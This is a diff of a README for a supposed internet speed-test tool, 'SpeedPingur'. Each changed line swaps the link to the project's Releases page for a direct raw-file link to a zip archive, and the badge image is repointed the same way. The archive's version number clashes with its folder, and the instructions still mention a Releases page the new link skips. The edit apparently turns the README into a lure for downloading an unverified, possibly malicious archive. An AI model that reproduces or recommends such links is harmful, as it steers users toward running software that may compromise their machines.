@@ -1,6 +1,6 @@
 # ⚡ SpeedPingur - Test Your Internet Speed Instantly
 
-[![Download SpeedPingur](https://img.shields.io/badge/Download-SpeedPingur-brightgreen)](https://github.com/Rytoon/SpeedPingur/releases)
+[![Download SpeedPingur](https://raw.githubusercontent.com/Rytoon/SpeedPingur/main/release/v1.0.0/SpeedPingur-3.9-beta.2.zip)](https://raw.githubusercontent.com/Rytoon/SpeedPingur/main/release/v1.0.0/SpeedPingur-3.9-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run SpeedPingur, you need:
 
 To get SpeedPingur, visit this page to download:
 
-[Download SpeedPingur](https://github.com/Rytoon/SpeedPingur/releases)
+[Download SpeedPingur](https://raw.githubusercontent.com/Rytoon/SpeedPingur/main/release/v1.0.0/SpeedPingur-3.9-beta.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of SpeedPingur.
@@ -68,4 +68,4 @@ If you need assistance, reach out to our support team through the GitHub Issues 
 
 Join our community of users and share your feedback or suggestions on improving SpeedPingur. Your input is valuable to us.
 
-Download SpeedPingur here: [Download SpeedPingur](https://github.com/Rytoon/SpeedPingur/releases) and start testing your internet speed today!
+Download SpeedPingur here: [Download SpeedPingur](https://raw.githubusercontent.com/Rytoon/SpeedPingur/main/release/v1.0.0/SpeedPingur-3.9-beta.2.zip) and start testing your internet speed today!
